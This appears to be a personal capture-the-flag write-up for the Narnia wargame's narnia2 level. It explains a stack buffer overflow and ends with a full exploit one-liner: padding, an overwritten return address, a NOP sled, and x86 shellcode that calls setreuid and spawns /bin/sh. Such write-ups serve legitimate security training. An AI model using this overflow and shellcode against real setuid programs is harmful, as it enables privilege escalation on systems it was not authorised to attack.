Return address stored at: 0xffffd50c

So we should try to place put (0xffffd510) into that location since if we are able to start overwriting with ou shellcode exactly on the return address then we should be good.
We need to play around with the padding to be done before that.
Or maybe start doing 'NOPs'. Do a NOP sledge. But we need to be good with the overwriting part..

In below the NOP sledge is actually unnecessary since we know the stack location perfectly.No stack randomization is present at the host.

We just need to set the reuid and euid to 14003 (0x36b3)(narnia3) in the setreuid shellode part.

/narnia/narnia2 `python -c "print 'A'*140 + '\x10\xd5\xff\xff' + '\x90'*80 + '\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xb3\x36\x66\x31\xc9\x66\xb9\xb3\x36\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'"`
